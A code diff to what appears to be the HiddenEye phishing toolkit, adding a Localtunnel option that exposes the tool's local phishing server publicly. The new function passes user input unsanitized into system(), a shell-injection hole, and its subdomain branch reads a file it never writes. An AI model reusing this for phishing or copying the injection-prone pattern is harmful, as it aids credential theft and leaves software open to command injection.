@@ -158,7 +158,7 @@ def selectServer(port): #Question where user must select server
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
         print(_("\n {1}[{0}!{1}]{1}(LOCALXPOSE/SERVEO WORKS BETTER)").format(MAIN0, MAIN2))
         print(_("\n {0}[{1}*{0}]{0}Select Any Available Server:{1}").format(MAIN0, MAIN4))
-        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose").format(MAIN0, MAIN2))
+        print(_("\n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel").format(MAIN0, MAIN2))
 
         choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
         if choice == '1':
@@ -188,7 +188,9 @@ def selectServer(port): #Question where user must select server
         elif choice == '3':
             system('clear')
             runLocalxpose(port)    
-
+        elif choice == '4':
+            system('clear')
+            runLT(port)
         else:
             system('clear')
             return selectServer(port)
@@ -213,6 +215,26 @@ def runLocalxpose(port):
         system('clear')
         return runLocalxpose(port)        
 
+def runLT(port):
+    s=input(('{1}[leave blank for random]\n{0}hiddeneye(localtunnel/subdomain)> {2}').format(MAIN0,MAIN4,MAIN2))
+    if s=='':
+        try:
+            system('lt -p {0} > link.url &'.format(port))
+            sleep(3)
+            output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)
+            url = str(output).strip("b ' \ n r")
+            print("\n{2}[127.0.0.1:{3}]{0}{1} -> {2}[{4}]{0}".format(MAIN0, MAIN2, MAIN3, port, url))
+        except CalledProcessError:
+            pass
+    else:
+        try:
+            system('lt -p {0} -s {1} &'.format(port,(s if '.localtunnel.me' in s else (s+'.localtunnel.me'))))
+            sleep(3)
+            output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",shell=True)
+            url = str(output).strip("b ' \ n r")
+            print("\n{2}[127.0.0.1:{3}]{0}{1} -> {2}[{4}]{0}".format(MAIN0, MAIN2, MAIN3, port, url))
+        except CalledProcessError:
+            print('\n{0}error[invalid/preoccupied]{0}'.format(MAIN0, MAIN4))
 def customLocalxpose(port):
 
     print(_('''
